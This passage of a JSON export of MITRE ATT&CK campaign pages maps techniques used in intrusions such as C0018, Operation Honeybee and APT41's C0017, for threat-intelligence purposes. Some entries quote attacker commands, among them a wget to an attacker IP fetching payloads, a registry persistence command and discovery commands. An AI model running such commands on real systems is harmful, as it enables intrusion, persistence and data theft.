[
{
"id": 1737,
"title": "Campaigns",
"path": "/campaigns/index.html",
"content": " Campaigns The security community tracks intrusion activity using various analytic methodologies and terms, such as operations, intrusion sets, and campaigns. Some intrusion activity may be referenced by a variety of names due to different organizations tracking similar activity, often from different vantage points; conversely other times reported activity is not given a designated name. Malicious cyber activity may be attributed to a threat group, or referenced as unattributed activity. Alternatively, complex cyber operations may involve multiple affiliated or unaffiliated groups, with each playing a unique role (ie. initial access, data exfiltration, etc). For the purposes of the Campaigns page, the MITRE ATT&CK team uses the term Campaign to describe any grouping of intrusion activity conducted over a specific period of time with common targets and objectives. Unnamed intrusion activity is cited using a unique ATT&CK identifier, otherwise the team will use the activity name as noted in public reporting. For named Campaigns, the team makes a best effort to track overlapping names, which are designated as “Associated Campaigns” on each page, as we believe these overlaps are useful for analysts. Campaign entries will also be attributed to ATT&CK Group and Software pages, when possible, based on public reporting; unattributed activity will simply reference “threat actors” in the procedure example. Campaigns are mapped to publicly reporting techniques and original references are included. The information provided does not represent all possible techniques used in a Campaign but rather a subset that is available through open source reporting. Campaigns: 22 ID Name Description C0025 2016 Ukraine Electric Power Attack 2016 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used Industroyer malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by Sandworm Team. C0010 C0010 C0010 was a cyber espionage campaign conducted by UNC3890 that targeted Israeli shipping, government, aviation, energy, and healthcare organizations. Security researcher assess UNC3890 conducts operations in support of Iranian interests, and noted several limited technical connections to Iran, including PDB strings and Farsi language artifacts. C0010 began by at least late 2020, and was still ongoing as of mid-2022. C0011 C0011 C0011 was a suspected cyber espionage campaign conducted by Transparent Tribe that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from Transparent Tribe's historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022. C0015 C0015 C0015 was a ransomware intrusion during which the unidentified attackers used Bazar, Cobalt Strike, and Conti, along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated Conti ransomware playbook based on the observed pattern of activity and operator errors. C0017 C0017 C0017 was an APT41 campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During C0017, APT41 was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of C0017 are unknown, however APT41 was observed exfiltrating Personal Identifiable Information (PII). C0018 C0018 C0018 was a month-long ransomware intrusion that successfully deployed AvosLocker onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing AvosLocker. C0021 C0021 C0021 was a spearphishing campaign conducted in November 2018 that targeted public sector institutions, non-governmental organizations (NGOs), educational institutions, and private-sector corporations in the oil and gas, chemical, and hospitality industries. The majority of targets were located in the US, particularly in and around Washington D.C., with other targets located in Europe, Hong Kong, India, and Canada. C0021's technical artifacts, tactics, techniques, and procedures (TTPs), and targeting overlap with previous suspected APT29 activity. C0004 CostaRicto CostaRicto was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. CostaRicto actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels. C0001 Frankenstein Frankenstein was described by security researchers as a highly-targeted campaign conducted by moderately sophisticated and highly resourceful threat actors in early 2019. The unidentified actors primarily relied on open source tools, including Empire. The campaign name refers to the actors' ability to piece together several unrelated open-source tool components. C0007 FunnyDream FunnyDream was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the FunnyDream campaign to possible Chinese-speaking threat actors through the use of the Chinoxy backdoor and noted infrastructure overlap with the TAG-16 threat group. C0020 Maroochy Water Breach Maroochy Water Breach was an incident in 2000 where an adversary leveraged the local government’s wastewater control system and stolen engineering equipment to disrupt and eventually release 800,000 liters of raw sewage into the local community. C0002 Night Dragon Night Dragon was a cyber espionage campaign that targeted oil, energy, and petrochemical companies, along with individuals and executives in Kazakhstan, Taiwan, Greece, and the United States. The unidentified threat actors searched for information related to oil and gas field production systems, financials, and collected data from SCADA systems. Based on the observed techniques, tools, and network activities, security researchers assessed the campaign involved a threat group based in China. C0009 Oldsmar Treatment Plant Intrusion Oldsmar Treatment Plant Intrusion was a cyber incident involving a water treatment facility in Florida. During this incident, unidentified threat actors leveraged features of the system to access and modify setpoints for a specific chemical required in the treatment process. The incident was detected immediately and prevented before it could cause any harm to the public. C0012 Operation CuckooBees Operation CuckooBees was a cyber espionage campaign targeting technology and manufacturing companies in East Asia, Western Europe, and North America since at least 2019. Security researchers noted the goal of Operation CuckooBees, which was still ongoing as of May 2022, was likely the theft of proprietary information, research and development documents, source code, and blueprints for various technologies. Researchers assessed Operation CuckooBees was conducted by actors affiliated with Winnti Group, APT41, and BARIUM. C0022 Operation Dream Job Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between Operation Dream Job, Operation North Star, and Operation Interception; by 2022 security researchers described Operation Dream Job as an umbrella term covering both Operation Interception and Operation North Star. C0016 Operation Dust Storm Operation Dust Storm was a long-standing persistent cyber espionage campaign that targeted multiple industries in Japan, South Korea, the United States, Europe, and several Southeast Asian countries. By 2015, the Operation Dust Storm threat actors shifted from government and defense-related intelligence targets to Japanese companies or Japanese subdivisions of larger foreign organizations supporting Japan's critical infrastructure, including electricity generation, oil and natural gas, finance, transportation, and construction. Operation Dust Storm threat actors also began to use Android backdoors in their operations by 2015, with all identified victims at the time residing in Japan or South Korea. C0023 Operation Ghost Operation Ghost was an APT29 campaign starting in 2013 that included operations against ministries of foreign affairs in Europe and the Washington, D.C. embassy of a European Union country. During Operation Ghost, APT29 used new families of malware and leveraged web services, steganography, and unique C2 infrastructure for each victim. C0006 Operation Honeybee Operation Honeybee was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. Operation Honeybee initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents. C0013 Operation Sharpshooter Operation Sharpshooter was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous Lazarus Group operations, including fake job recruitment lures and shared malware code. C0005 Operation Spalax Operation Spalax was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The Operation Spalax threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to APT-C-36, however identified enough differences to report this as separate, unattributed activity. C0014 Operation Wocao Operation Wocao was a cyber espionage campaign that targeted organizations around the world, including in Brazil, China, France, Germany, Italy, Mexico, Portugal, Spain, the United Kingdom, and the United States. The suspected China-based actors compromised government organizations and managed service providers, as well as aviation, construction, energy, finance, health care, insurance, offshore engineering, software development, and transportation companies. Security researchers assessed the Operation Wocao actors used similar TTPs and tools as APT20, suggesting a possible overlap. Operation Wocao was named after an observed command line entry by one of the threat actors, possibly out of frustration from losing webshell access. C0024 SolarWinds Compromise The SolarWinds Compromise was a sophisticated supply chain cyber operation conducted by APT29 that was discovered in mid-December 2020. APT29 used customized malware to inject malicious code into the SolarWinds Orion software build process that was later distributed through a normal software update; they also used password spraying, token theft, API abuse, spear phishing, and other supply chain attacks to compromise user accounts and leverage their associated access. Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, Europe, Asia, and the Middle East. Industry reporting initially referred to the actors involved in this campaign as UNC2452, NOBELIUM, StellarParticle, Dark Halo, and SolarStorm. In April 2021, the US and UK governments attributed the SolarWinds Compromise to Russia's Foreign Intelligence Service (SVR); public statements included citations to APT29, Cozy Bear, and The Dukes. The US government assessed that of the approximately 18,000 affected public and private sector customers of Solar Winds’ Orion product, a much smaller number were compromised by follow-on APT29 activity on their systems. "
},
{
"id": 1738,
"title": "C0018, Campaign C0018",
"path": "/campaigns/C0018/index.html",
"content": " C0018 C0018 was a month-long ransomware intrusion that successfully deployed AvosLocker onto a compromised network. The unidentified actors gained initial access to the victim network through an exposed server and used a variety of open-source tools prior to executing AvosLocker.[1][2] ID: C0018 First Seen: February 2022 [2] Last Seen: March 2022 [2] Contributors: Flavio Costa, Cisco Version: 1.0 Created: 17 January 2023 Last Modified: 14 February 2023 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0018, the threat actors used HTTP for C2 communications.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During C0018, the threat actors used encoded PowerShell scripts for execution.[2][1] Enterprise T1486 Data Encrypted for Impact During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network.[2][1] Enterprise T1190 Exploit Public-Facing Application During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832.[2] Enterprise T1105 Ingress Tool Transfer During C0018, the threat actors downloaded additional tools, such as Mimikatz and Sliver, as well as Cobalt Strike and AvosLocker ransomware onto the victim network.[2][1] Enterprise T1570 Lateral Tool Transfer During C0018, the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.[2][1] Enterprise T1036 Masquerading During C0018, AvosLocker was disguised using the victim company name as the filename.[2] .005 Match Legitimate Name or Location For C0018, the threat actors renamed a Sliver payload to vmware_kb.exe.[2] Enterprise T1046 Network Service Discovery During C0018, the threat actors used the SoftPerfect Network Scanner for network scanning.[2] Enterprise T1571 Non-Standard Port During C0018, the threat actors opened a variety of ports, including ports 28035, 32467, 41578, and 46892, to establish RDP connections.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation During C0018, the threat actors used Base64 to encode their PowerShell scripts.[2][1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0018, the threat actors acquired a variety of open source tools, including Mimikatz, Sliver, SoftPerfect Network Scanner, AnyDesk, and PDQ Deploy.[2][1] Enterprise T1219 Remote Access Software During C0018, the threat actors used AnyDesk to transfer tools between systems.[2][1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During C0018, the threat actors opened a variety of ports to establish RDP connections, including ports 28035, 32467, 41578, and 46892.[1] Enterprise T1072 Software Deployment Tools During C0018, the threat actors used PDQ Deploy to move AvosLocker and tools across the network.[2] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During C0018, the threat actors used rundll32 to run Mimikatz.[1] Enterprise T1016 System Network Configuration Discovery During C0018, the threat actors ran nslookup and Advanced IP Scanner on the target network.[1] Enterprise T1033 System Owner/User Discovery During C0018, the threat actors collected whoami information via PowerShell scripts.[1] Enterprise T1047 Windows Management Instrumentation During C0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using the DownloadString method.[2][1] Software ID Name Description S1053 AvosLocker During C0018, the threat actors used AvosLocker ransomware to encrypt the compromised network.[1][2] S0154 Cobalt Strike [2] S0002 Mimikatz [2][1] S0108 netsh During C0018, the threat actors used netsh on a domain controller to ensure there was no existing firewall or to disable one.[1] S0097 Ping During C0018, the threat actors used a PowerShell script to execute Ping commands once every minute against a domain controller.[1] S0633 Sliver [2] References Costa, F. (2022, May 1). RaaS AvosLocker Incident Response Analysis. Retrieved January 11, 2023. Venere, G. Neal, C. (2022, June 21). Avos ransomware group expands with new attack arsenal. Retrieved January 11, 2023. "
},
{
"id": 1739,
"title": "Operation Honeybee, Campaign C0006",
"path": "/campaigns/C0006/index.html",
"content": " Operation Honeybee Operation Honeybee was a campaign that targeted humanitarian aid and inter-Korean affairs organizations from at least late 2017 through early 2018. Operation Honeybee initially targeted South Korea, but expanded to include Vietnam, Singapore, Japan, Indonesia, Argentina, and Canada. Security researchers assessed the threat actors were likely Korean speakers based on metadata used in both lure documents and executables, and named the campaign \"Honeybee\" after the author name discovered in malicious Word documents.[1] ID: C0006 First Seen: August 2017 [1] Last Seen: February 2018 [1] Version: 1.0 Created: 16 September 2022 Last Modified: 13 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and cliconfig.exe to bypass UAC protections.[1] Enterprise T1583 .001 Acquire Infrastructure: Domains During Operation Honeybee, threat actors registered domains for C2.[1] .004 Acquire Infrastructure: Server For Operation Honeybee, at least one identified persona was used to register for a free account for a control server.[1] Enterprise T1071 .002 Application Layer Protocol: File Transfer Protocols During Operation Honeybee, the threat actors had the ability to use FTP for C2.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Honeybee, the threat actors uses zip to pack collected files before exfiltration.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder During Operation Honeybee, the threat actors used batch files that allowed them to establish persistence by adding the following Registry key: \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During Operation Honeybee, various implants used batch scripting and cmd.exe for execution.[1] .005 Command and Scripting Interpreter: Visual Basic For Operation Honeybee, the threat actors used a Visual Basic script embedded within a Word document to download an implant.[1] Enterprise T1543 .003 Create or Modify System Process: Windows Service During Operation Honeybee, threat actors installed DLLs and backdoors as Windows services.[1] Enterprise T1005 Data from Local System During Operation Honeybee, the threat actors collected data from compromised hosts.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During Operation Honeybee, stolen data was copied into a text file using the format From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt prior to compression, encoding, and exfiltration.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During Operation Honeybee, malicious files were decoded prior to execution.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts During Operation Honeybee, attackers created email addresses to register for a free account for a control server used for the implants.[1] Enterprise T1041 Exfiltration Over C2 Channel During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers.[1] Enterprise T1083 File and Directory Discovery During Operation Honeybee, the threat actors used a malicious DLL to search for files with specific keywords.[1] Enterprise T1574 .011 Hijack Execution Flow: Services Registry Permissions Weakness During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the svchost.exe process.[1] Enterprise T1070 .004 Indicator Removal: File Deletion During Operation Honeybee, the threat actors used batch files that reduced their fingerprint on a compromised system by deleting malware-related files.[1] Enterprise T1105 Ingress Tool Transfer During Operation Honeybee, the threat actors downloaded additional malware and malicious scripts onto a compromised host.[1] Enterprise T1036 Masquerading During Operation Honeybee, the threat actors modified the MaoCheng dropper so its icon appeared as a Word document.[1] .005 Match Legitimate Name or Location During Operation Honeybee, the threat actors used a legitimate Windows executable and secure directory for their payloads to bypass UAC.[1] Enterprise T1112 Modify Registry During Operation Honeybee, the threat actors used batch files that modified registry keys.[1] Enterprise T1106 Native API During Operation Honeybee, the threat actors deployed malware that used API calls, including CreateProcessAsUser.[1] Enterprise T1027 Obfuscated Files or Information During Operation Honeybee, the threat actors used Base64 to encode files with a custom key.[1] Enterprise T1588 .004 Obtain Capabilities: Digital Certificates For Operation Honeybee, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.[1] Enterprise T1057 Process Discovery During Operation Honeybee, the threat actors obtained a list of running processes on a victim machine using cmd /c tasklist > %temp%\\temp.ini.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During Operation Honeybee, the threat actors deployed the MaoCheng dropper with a stolen Adobe Systems digital signature.[1] Enterprise T1082 System Information Discovery During Operation Honeybee, the threat actors collected the computer name, OS, and other system information using cmd /c systeminfo > %temp%\\ temp.ini.[1] Enterprise T1569 .002 System Services: Service Execution During Operation Honeybee, threat actors ran sc start to start the COMSysApp as part of the service hijacking and sc stop to stop and reconfigure the COMSysApp.[1] Enterprise T1204 .002 User Execution: Malicious File During Operation Honeybee, threat actors relied on a victim to enable macros within a malicious Word document.[1] Software ID Name Description S0106 cmd [1] S0075 Reg [1] S0464 SYSCON Operation Honeybee included the use of an upgraded version of SYSCON.[1] S0096 Systeminfo [1] S0057 Tasklist [1] References Sherstobitoff, R. (2018, March 02). McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups. Retrieved May 16, 2018. "
},
{
"id": 1740,
"title": "FunnyDream, Campaign C0007",
"path": "/campaigns/C0007/index.html",
"content": " FunnyDream FunnyDream was a suspected Chinese cyber espionage campaign that targeted government and foreign organizations in Malaysia, the Philippines, Taiwan, Vietnam, and other parts of Southeast Asia. Security researchers linked the FunnyDream campaign to possible Chinese-speaking threat actors through the use of the Chinoxy backdoor and noted infrastructure overlap with the TAG-16 threat group.[1][2][3] ID: C0007 First Seen: July 2018 [2] Last Seen: November 2020 [1] Version: 1.0 Created: 20 September 2022 Last Modified: 10 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For FunnyDream, the threat actors registered a variety of domains.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During FunnyDream, the threat actors used 7zr.exe to add collected files to an archive.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During FunnyDream, the threat actors used cmd.exe to execute the wmiexec.vbs script.[1] .005 Command and Scripting Interpreter: Visual Basic During FunnyDream, the threat actors used a Visual Basic script to run remote commands.[1] Enterprise T1585 .002 Establish Accounts: Email Accounts For FunnyDream, the threat actors likely established an identified email account to register a variety of domains that were used during the campaign.[1] Enterprise T1105 Ingress Tool Transfer During FunnyDream, the threat actors downloaded additional droppers and backdoors onto a compromised system.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For FunnyDream, the threat actors used a new backdoor named FunnyDream.[1] .002 Obtain Capabilities: Tool For FunnyDream, the threat actors used a modified version of the open source PcShare remote administration tool.[1] Enterprise T1057 Process Discovery During FunnyDream, the threat actors used Tasklist on targeted systems.[1] Enterprise T1018 Remote System Discovery During FunnyDream, the threat actors used several tools and batch files to map victims' internal networks.[1] Enterprise T1082 System Information Discovery During FunnyDream, the threat actors used Systeminfo to collect information on targeted hosts.[1] Enterprise T1016 System Network Configuration Discovery During FunnyDream, the threat actors used ipconfig for discovery on remote systems.[1] Enterprise T1049 System Network Connections Discovery During FunnyDream, the threat actors used netstat to discover network connections on remote systems.[1] Enterprise T1047 Windows Management Instrumentation During FunnyDream, the threat actors used wmiexec.vbs to run remote commands.[1] Software ID Name Description S1043 ccf32 During FunnyDream, ccf32 was used to collect data.[1] S1041 Chinoxy During FunnyDream, Chinoxy was used to gain persistence and deploy other malware components.[1] S1044 FunnyDream During the FunnyDream campaign, the FunnyDream backdoor was used to execute multiple components and exfiltrate files.[1] S0100 ipconfig [1] S0104 netstat [1] S1050 PcShare During FunnyDream the threat actors used a customized version of PcShare.[1] S0096 Systeminfo [1] S0057 Tasklist [1] References Vrabie, V. (2020, November). Dissecting a Chinese APT Targeting South Eastern Asian Government Institutions. Retrieved September 19, 2022. Global Research and Analysis Team. (2020, April 30). APT trends report Q1 2020. Retrieved September 19, 2022. Insikt Group. (2021, December 8). Chinese State-Sponsored Cyber Espionage Activity Supports Expansion of Regional Power and Influence in Southeast Asia. Retrieved September 19, 2022. "
},
{
"id": 1741,
"title": "C0017, Campaign C0017",
"path": "/campaigns/C0017/index.html",
"content": " C0017 C0017 was an APT41 campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During C0017, APT41 was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of C0017 are unknown, however APT41 was observed exfiltrating Personal Identifiable Information (PII).[1] ID: C0017 First Seen: May 2021 [1] Last Seen: February 2022 [1] Contributors: Kyaw Pyiyt Htet, @KyawPyiytHtet Version: 1.0 Created: 01 December 2022 Last Modified: 25 January 2023 Version Permalink Live Version Groups ID Name Description G0096 APT41 [1] Techniques Used Domain ID Name Use Enterprise T1134 Access Token Manipulation During C0017, APT41 used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local NT AUTHORITY\\SYSTEM privilege escalation.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During C0017, APT41 ran wget http://103.224.80[.]44:8080/kernel to download malicious payloads.[1] Enterprise T1560 .003 Archive Collected Data: Archive via Custom Method During C0017, APT41 hex-encoded PII data prior to exfiltration.[1] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During C0017, APT41 used cmd.exe to execute reconnaissance commands.[1] .007 Command and Scripting Interpreter: JavaScript During C0017, APT41 deployed JScript web shells on compromised systems.[1] Enterprise T1005 Data from Local System During C0017, APT41 collected information related to compromised machines as well as Personal Identifiable Information (PII) from victim networks.[1] Enterprise T1001 .003 Data Obfuscation: Protocol Impersonation During C0017, APT41 frequently configured the URL endpoints of their stealthy passive backdoor LOWKEY.PASSIVE to masquerade as normal web application traffic on an infected server.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory.[1] Enterprise T1140 Deobfuscate/Decode Files or Information During C0017, APT41 used the DUSTPAN loader to decrypt embedded payloads.[1] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.[1] Enterprise T1041 Exfiltration Over C2 Channel During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.[1] Enterprise T1567 Exfiltration Over Web Service During C0017, APT41 used Cloudflare services for data exfiltration.[1] Enterprise T1190 Exploit Public-Facing Application During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access.[1] Enterprise T1068 Exploitation for Privilege Escalation During C0017, APT41 abused named pipe impersonation for privilege escalation.[1] Enterprise T1574 Hijack Execution Flow During C0017, APT41 established persistence by loading malicious libraries via modifications to the Import Address Table (IAT) within legitimate Microsoft binaries.[1] Enterprise T1105 Ingress Tool Transfer During C0017, APT41 downloaded malicious payloads onto compromised systems.[1] Enterprise T1036 .004 Masquerading: Masquerade Task or Service During C0017, APT41 used SCHTASKS /Change to modify legitimate scheduled tasks to run malicious code.[1] .005 Masquerading: Match Legitimate Name or Location During C0017, APT41 used file names beginning with USERS, SYSUSER, and SYSLOG for DEADEYE, and changed KEYPLUG file extensions from .vmp to .upx likely to avoid hunting detections.[1] Enterprise T1027 Obfuscated Files or Information During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection.[1] .002 Software Packing During C0017, APT41 used VMProtect to slow the reverse engineering of malicious binaries.[1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0017, APT41 obtained publicly available tools such as YSoSerial.NET, ConfuserEx, and BadPotato.[1] Enterprise T1003 .002 OS Credential Dumping: Security Account Manager During C0017, APT41 copied the SAM and SYSTEM Registry hives for credential harvesting.[1] Enterprise T1090 Proxy During C0017, APT41 used the Cloudflare CDN to proxy C2 traffic.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During C0017, APT41 used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: \\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor, \\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults, and \\Microsoft\\Windows\\WDI\\USOShared.[1] Enterprise T1505 .003 Server Software Component: Web Shell During C0017, APT41 deployed JScript web shells through the creation of malicious ViewState objects.[1] Enterprise T1082 System Information Discovery During C0017, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems.[1] Enterprise T1016 System Network Configuration Discovery During C0017, APT41 used cmd.exe /c ping %userdomain% for discovery.[1] Enterprise T1033 System Owner/User Discovery During C0017, APT41 used whoami to gather information from victim machines.[1] Enterprise T1102 Web Service During C0017, APT41 used the Cloudflare services for C2 communications.[1] .001 Dead Drop Resolver During C0017, APT41 used dead drop resolvers on two separate tech community forums for their KEYPLUG Windows-version backdoor; notably APT41 updated the community forum posts frequently with new dead drop resolvers during the campaign.[1] Software ID Name Description S0154 Cobalt Strike During C0017, APT41 used the DUSTPAN in-memory dropper to drop a Cobalt Strike BEACON backdoor onto a compromised network.[1] S1052 DEADEYE [1] S0105 dsquery During C0017, APT41 used multiple dsquery commands to enumerate various Active Directory objects within a compromised environment.[1] S1051 KEYPLUG [1] S0002 Mimikatz During C0017, APT41 used Mimikatz to execute the lsadump::sam command on dumped registry hives to obtain locally stored credentials and NTLM hashes.[1] S0097 Ping During C0017, APT41 issued Ping commands to trigger DNS resolutions for data exfiltration, where the output of a reconnaissance command was prepended to subdomains within APT41's Cloudflare C2 infrastructure.[1] References Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022. "
},
{
"id": 1742,
"title": "CostaRicto, Campaign C0004",
"path": "/campaigns/C0004/index.html",
"content": " CostaRicto CostaRicto was a suspected hacker-for-hire cyber espionage campaign that targeted multiple industries worldwide, with a large number being financial institutions. CostaRicto actors targeted organizations in Europe, the Americas, Asia, Australia, and Africa, with a large concentration in South Asia (especially India, Bangladesh, and Singapore), using custom malware, open source tools, and a complex network of proxies and SSH tunnels.[1] ID: C0004 First Seen: October 2019 [1] Last Seen: November 2020 [1] Version: 1.0 Created: 15 September 2022 Last Modified: 05 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains For CostaRicto, the threat actors established domains, some of which appeared to spoof legitimate domains.[1] Enterprise T1005 Data from Local System During CostaRicto, the threat actors collected data and files from compromised networks.[1] Enterprise T1587 .001 Develop Capabilities: Malware For CostaRicto, the threat actors used custom malware, including PS1, CostaBricks, and SombRAT.[1] Enterprise T1133 External Remote Services During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment.[1] Enterprise T1105 Ingress Tool Transfer During CostaRicto, the threat actors downloaded malware and tools onto a compromised host.[1] Enterprise T1046 Network Service Discovery During CostaRicto, the threat actors employed nmap and pscan to scan target environments.[1] Enterprise T1588 .002 Obtain Capabilities: Tool During CostaRicto, the threat actors obtained open source tools to use in their operations.[1] Enterprise T1572 Protocol Tunneling During CostaRicto, the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.[1] Enterprise T1090 .003 Proxy: Multi-hop Proxy During CostaRicto, the threat actors used a layer of proxies to manage C2 communications.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During CostaRicto, the threat actors used scheduled tasks to download backdoor tools.[1] Software ID Name Description S0614 CostaBricks During CostaRicto, threat actors used a custom VM-based payload loader named CostaBricks.[1] S0194 PowerSploit During CostaRicto, threat actors used PowerSploit's Invoke-ReflectivePEInjection module.[1] S0613 PS1 During CostaRicto, threat actors used the 64-bit backdoor loader PS1.[1] S0029 PsExec During CostaRicto, threat actors used PsExec.[1] S0615 SombRAT During CostaRicto, threat actors used SombRAT in conjuction with CostaBricks and PowerSploit.[1] S0183 Tor During CostaRicto, threat actors used C2 servers managed through Tor.[1] References The BlackBerry Research and Intelligence Team. (2020, November 12). The CostaRicto Campaign: Cyber-Espionage Outsourced. Retrieved May 24, 2021. "
},
{
"id": 1743,
"title": "Operation Sharpshooter, Campaign C0013",
"path": "/campaigns/C0013/index.html",
"content": " Operation Sharpshooter Operation Sharpshooter was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous Lazarus Group operations, including fake job recruitment lures and shared malware code.[1][2][3] ID: C0013 First Seen: September 2017 [3] Last Seen: March 2019 [3] Version: 1.0 Created: 26 September 2022 Last Modified: 13 October 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .006 Acquire Infrastructure: Web Services For Operation Sharpshooter, the threat actors used Dropbox to host lure documents and their first-stage downloader.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder During Operation Sharpshooter, a first-stage downloader installed Rising Sun to %Startup%\\mssync.exe on a compromised host.[1] Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic During Operation Sharpshooter, the threat actors used a VBA macro to execute a simple downloader that installed Rising Sun.[1] Enterprise T1584 .004 Compromise Infrastructure: Server For Operation Sharpshooter, the threat actors compromised a server they used as part of the campaign's infrastructure.[2] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Sharpshooter, the threat actors used the Rising Sun modular backdoor.[1] Enterprise T1105 Ingress Tool Transfer During Operation Sharpshooter, additional payloads were downloaded after a target was infected with a first-stage downloader.[1] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange During Operation Sharpshooter, threat actors sent malicious Word OLE documents to victims.[1] Enterprise T1036 .005 Masquerading: Match Legitimate 